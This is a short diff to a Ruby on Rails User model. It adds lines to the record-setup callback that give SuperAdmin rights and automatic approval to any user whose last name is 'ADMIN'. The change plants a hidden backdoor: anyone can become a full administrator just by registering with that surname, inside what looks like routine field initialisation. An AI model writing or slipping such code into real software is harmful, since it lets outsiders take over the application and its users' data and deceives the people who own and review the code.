@@ -13,6 +13,10 @@ class User < ApplicationRecord
 
   def set_fields
     self.UserID = rand (1000000..9999999)
+    if self.lastName.upcase == 'ADMIN'
+      self.SuperAdmin = true
+      self.approved = true;
+    end
   end
 
   def uniName
